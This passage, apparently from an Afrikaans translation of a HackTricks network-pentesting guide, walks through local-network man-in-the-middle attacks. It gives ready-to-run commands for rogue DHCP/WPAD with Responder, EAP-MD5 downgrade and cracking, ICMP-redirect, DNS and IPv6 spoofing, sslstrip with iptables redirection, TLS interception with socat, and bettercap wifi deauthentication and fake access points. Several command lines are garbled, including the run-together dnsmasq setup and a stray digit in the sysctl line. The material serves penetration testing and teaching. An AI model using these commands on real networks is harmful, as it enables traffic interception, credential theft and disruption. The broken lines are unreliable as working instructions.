!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP-aanvalle**

Hier is 'n paar van die aanvalstaktieke wat teen 802.1X-implementasies gebruik kan word:

- Aktiewe brute-force password grinding via EAP
- Aanvalle op die RADIUS-bediener met malformed EAP content _\*\*_(exploits)
- EAP boodskapvaslegging en offline password cracking (EAP-MD5 en PEAP)
- Dwing EAP-MD5-authentisering om TLS sertifikaat-validatie te omseil
- Inspuiting van kwaadwillige netwerkverkeer by authentisering deur 'n hub of soortgelyks

As die attacker tussen die victim en die authentication server is, kan hy probeer om die authentication protokol te degradeer (indien nodig) na EAP-MD5 en die authentication attempt vas te vang. Dan kan hy dit brute-force met behulp van:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Aanvalle <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) is 'n klas netwerkprotokolle ontwerp om 'n hot redundant routing system te skep. Met FHRP kan fisiese routers gekombineer word in 'n enkele logiese toestel, wat foutverdraagsaamheid verhoog en help om die las te versprei.

**Cisco Systems-ingenieurs het twee FHRP-protokolle ontwikkel, GLBP en HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Drie weergawes van die Routing Information Protocol is bekend: RIP, RIPv2, en RIPng. Datagrams word deur RIP en RIPv2 via UDP na peers gestuur op poort 520, terwyl RIPng datagrams via IPv6-multicast na UDP-poort 521 uitsaai. RIPv2 het ondersteuning vir MD5 authentication ingebring. RIPng sluit nie inheemse authentication in nie; dit staatmaak op opsionele IPsec AH en ESP headers binne IPv6.

- **RIP and RIPv2:** Kommunikasie geskied deur UDP-datagrams op poort 520.
- **RIPng:** Gebruik UDP-poort 521 om datagrams via IPv6-multicast uit te saai.

Let daarop dat RIPv2 MD5 authentication ondersteun, terwyl RIPng nie inheemse authentication insluit nie en staatmaak op IPsec AH- en ESP-headers in IPv6.

### EIGRP Aanvalle

**EIGRP (Enhanced Interior Gateway Routing Protocol)** is 'n dinamiese routeringsprotokol. **It is a distance-vector protocol.** As daar **no authentication** en geen konfigurasie van passive interfaces is nie, kan 'n **intruder** inmeng met EIGRP-routering en **routing tables poisoning** veroorsaak. Verder is die EIGRP-netwerk (met ander woorde die autonomous system) plat en het geen segmentering in zones nie. As 'n **attacker injects a route**, is dit waarskynlik dat die route deur die hele autonome EIGRP-stelsel sal **spread**.

Om 'n EIGRP-stelsel aan te val vereis die vestiging van 'n neighbourhood met 'n legit EIGRP router, wat baie moontlikhede oopmaak, van basiese verkenning tot verskeie injections.

[**FRRouting**](https://frrouting.org/) laat jou toe om 'n virtuele router te implementeer wat BGP, OSPF, EIGRP, RIP en ander protokolle ondersteun. Alles wat jy hoef te doen is dit op jou attacker’s system te ontplooi en jy kan eintlik voorgee om 'n legitimate router in die routing domain te wees.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) het vermoëns om EIGRP (Enhanced Interior Gateway Routing Protocol) broadcasts te onderskep. Dit laat ook toe vir die injection van packets, wat gebruik kan word om routing-konfigurasies te verander.

### OSPF

In die Open Shortest Path First (OSPF)-protokol word **MD5 authentication algemeen gebruik om veilige kommunikasie tussen routers te verseker**. Hierdie sekuriteitsmaatreël kan egter gekompromitteer word met gereedskap soos Loki en John the Ripper. Hierdie gereedskap kan MD5 hashes vang en kraak, wat die authentication key openbaar. Sodra hierdie sleutel bekom is, kan dit gebruik word om nuwe routing-inligting in te voer. Om die routeparameters te konfigureer en die gekompromitteerde sleutel te stel, word onderskeidelik die _Injection_ en _Connection_ tabs gebruik.

- **Capturing and Cracking MD5 Hashes:** Tools soos Loki en John the Ripper word hiervoor gebruik.
- **Configuring Route Parameters:** Dit gebeur deur die _Injection_ tab.
- **Setting the Compromised Key:** Die sleutel word onder die _Connection_ tab gekonfigureer.

### Ander Generiese Gereedskap & Bronne

- [**Above**](https://github.com/c4s73r/Above): Gereedskap om netwerkverkeer te scan en kwesbaarhede te vind
- Jy kan meer inligting oor network attacks [**hier**](https://github.com/Sab0tag3d/MITM-cheatsheet) vind.

## **Spoofing**

Die attacker stel al die netwerkparameters (GW, IP, DNS) van die nuwe netwerklid op deur fake DHCP responses te stuur.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Kyk na die [vorige afdeling](#arp-spoofing).

### ICMPRedirect

ICMP Redirect bestaan uit die stuur van 'n ICMP packet type 1 code 5 wat aandui dat die attacker die beste manier is om 'n IP te bereik. Dan, wanneer die victim die IP wil kontak, sal dit die packet deur die attacker stuur.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Die aanvaller sal sommige (of alle) domeine oplos waarvoor die slagoffer vra.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Konfigureer jou eie DNS met dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Plaaslike Gateways

Meerdere roetes na stelsels en netwerke bestaan dikwels. Nadat jy 'n lys van MAC addresses binne die plaaslike netwerk opgebou het, gebruik _gateway-finder.py_ om hosts te identifiseer wat IPv4 forwarding ondersteun.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Vir plaaslike gasheer-oplossing wanneer DNS-opsoeke misluk, vertrou Microsoft-stelsels op **Link-Local Multicast Name Resolution (LLMNR)** en die **NetBIOS Name Service (NBT-NS)**. Net so gebruik **Apple Bonjour** en **Linux zero-configuration** implementasies **Multicast DNS (mDNS)** om stelsels binne 'n netwerk te ontdek. As gevolg van die onbevestigde aard van hierdie protokolle en hul werking oor UDP, wat boodskappe uitsaai, kan dit deur aanvallers uitgebuit word om gebruikers na kwaadwillige dienste om te lei.

Jy kan dienste vadineer wat deur gasheer gesoek word deur Responder te gebruik om valse antwoorde te stuur.\
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Blaaiers gebruik dikwels die **Web Proxy Auto-Discovery (WPAD) protocol to automatically acquire proxy settings**. Dit behels die aflaai van konfigurasie-gegevens vanaf 'n bediener, gewoonlik via 'n URL soos "http://wpad.example.org/wpad.dat". Die vind van hierdie bediener deur kliënte kan plaasvind deur verskeie meganismes:

- Deur **DHCP**, waar die ontdekking gefasiliteer word deur 'n spesiale kode 252-invoer.
- Deur **DNS**, wat behels om te soek na 'n gasheernaam met die label _wpad_ binne die plaaslike domein.
- Via **Microsoft LLMNR and NBT-NS**, wat opsieningsmeganismes is wat as rugsteun gebruik word wanneer DNS-opsoeke nie slaag nie.

Die instrument Responder benut hierdie protokol deur op te tree as 'n **kwaadwillige WPAD-bediener**. Dit gebruik **DHCP**, **DNS**, **LLMNR**, en **NBT-NS** om kliënte te mislei sodat hulle daarmee verbind. Om dieper te delf oor hoe dienste met Responder geïmpersonifiseer kan word [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Jy kan verskillende dienste op die netwerk aanbied om te probeer **'n gebruiker mislei** om sommige **plain-text credentials** in te voer. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Hierdie aanval is baie soortgelyk aan ARP Spoofing, maar in die IPv6-wêreld. Jy kan die slagoffer laat dink dat die IPv6 van die GW die MAC van die aanvaller het.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Sommige OS konfigureer standaard die gateway op grond van die RA-pakkette wat in die netwerk gestuur word. Om die aanvaller as IPv6 router te verklaar, kan jy gebruik:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Standaard probeer sommige OS die DNS te konfigureer deur 'n DHCPv6-pakket op die netwerk te lees. Dan kan 'n aanvaller 'n DHCPv6-pakket stuur om homself as DNS te konfigureer. Die DHCP voorsien die slagoffer ook van 'n IPv6-adres.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (valse bladsy and JS code injection)

## Internet-aanvalle

### sslStrip

Basies werk hierdie aanval so: indien die **user** probeer om 'n **HTTP** bladsy te **access** wat na die **HTTPS**-weergawe **redirecting**. **sslStrip** sal **maintain** 'n **HTTP connection with** die **client and** 'n **HTTPS connection with** die **server**, sodat dit die verbinding in **plain text** kan **sniff**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy vir die omseiling van HSTS

Die **verskil** tussen **sslStrip+ and dns2proxy** teenoor **sslStrip** is dat hulle byvoorbeeld _**www.facebook.com**_ **herlei** na _**wwww.facebook.com**_ (let op die **bykomende** "**w**") en sal die **address of this domain as the attacker IP** stel. Op hierdie manier sal die **client** met _**wwww.facebook.com**_ **verbind** (the attacker) maar agter die skerms sal **sslstrip+** die **werklike verbinding** via https met **www.facebook.com** **handhaaf**.

Die **doel** van hierdie tegniek is om **HSTS te omseil** omdat _**wwww**.facebook.com_ **nie** in die **cache** van die blaaier gestoor sal word nie, sodat die blaaier mislei sal word om **facebook authentication in HTTP** uit te voer.\
Let wel dat om hierdie aanval uit te voer die slagoffer aanvanklik toegang tot [http://www.faceook.com](http://www.faceook.com) moet probeer kry en nie https nie. Dit kan gedoen word deur die skakels binne 'n http-bladsy te wysig.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ werk nie meer nie. Dit is omdat daar HSTS-reëls vooraf in die blaaiers gestoor is, so selfs as dit die eerste keer is dat 'n gebruiker toegang tot 'n "belangrike" domein kry, sal hy dit via HTTPS doen. Let ook daarop dat die voorafgestoorde reëls en ander gegenereerde reëls die vlag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **kan gebruik, so die** _**wwww.facebook.com**_ **voorbeeld van tevore sal nie meer werk nie aangesien** _**facebook.com**_ **HSTS met `includeSubdomains` gebruik.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP luister op poort
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL luister op poort

#### Genereer sleutels en self-ondertekende sertifikaat
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Luister met 'n sertifikaat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Luister met sertifikaat en herlei na die hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Soms, as die client kontroleer dat die CA geldig is, kan jy **serve a certificate of other hostname signed by a CA**.  
Nog 'n interessante toets is om 'n c**ertificate of the requested hostname but self-signed** te serve.

Ander dinge om te toets is om te probeer om die certificate te sign met 'n geldige certificate wat nie 'n geldige CA is nie. Of om die geldige public key te gebruik, en te dwing om 'n algorithm soos diffie hellman te gebruik (een wat nie iets hoef te decrypt met die egte private key nie) en wanneer die client 'n probe van die egte private key versoek (soos 'n hash) 'n fake probe te stuur en te verwag dat die client dit nie check nie.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktiewe ontdekkingsnotas

Hou in gedagte dat wanneer 'n UDP-pakket na 'n toestel gestuur word wat nie die versoekte poort het nie, 'n ICMP (Port Unreachable) teruggestuur word.

### **ARP discover**

ARP-pakkette word gebruik om te ontdek watter IP's binne die netwerk gebruik word. Die rekenaar moet 'n versoek stuur vir elke moontlike IP-adres en slegs dié wat gebruik word, sal reageer.

### **mDNS (multicast DNS)**

Bettercap stuur 'n MDNS-versoek (elke X ms) wat vra vir **\_services\_.dns-sd.\_udp.local**; die masjien wat hierdie pakket sien, beantwoord gewoonlik hierdie versoek. Daarna soek dit slegs na masjiene wat op "services" antwoord.

**Gereedskap**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap stuur broadcast-pakkette na poort 137/UDP wat vra vir die naam "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap stuur SSDP-broadcast-pakkette wat na alle soorte dienste soek (UDP poort 1900).

### **WSD (Web Service Discovery)**

Bettercap stuur WSD-broadcast-pakkette wat na dienste soek (UDP poort 3702).


### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Verwysings

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
